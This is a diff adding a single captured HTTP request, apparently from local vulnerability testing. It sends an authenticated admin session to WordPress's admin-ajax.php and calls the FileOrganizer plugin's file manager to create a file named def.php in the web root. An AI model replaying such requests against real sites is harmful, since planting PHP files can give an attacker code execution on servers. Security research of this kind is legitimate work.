@@ -1,0 +1,16 @@
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost/wordpress/wp-admin/admin.php?page=fileorganizer
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 129
+Origin: http://localhost
+Connection: keep-alive
+Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1754892899%7CBFIKF0pp1EvkTNqfMjLpI2J6xhz2HoSTfaGZtfsC8kP%7Cc48923266e58a7fc953016a3630b2c9fb4651250d680419468f60bde8e9e7ec3; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1754892899%7CBFIKF0pp1EvkTNqfMjLpI2J6xhz2HoSTfaGZtfsC8kP%7C1823e9770a2cc17b9cddc2d1f65a41422baa0c75dff251cd9845bb88bfeaaca9; wp-settings-time-1=1754720472; PHPSESSID=tq82hp923de45m9b2ra3tsfl8g
+Priority: u=0
+
+action=fileorganizer_file_folder_manager&fileorganizer_nonce=ff8f492c08&cmd=mkfile&name=def.php&target=l1_Lw&reqid=1988d8c5326125
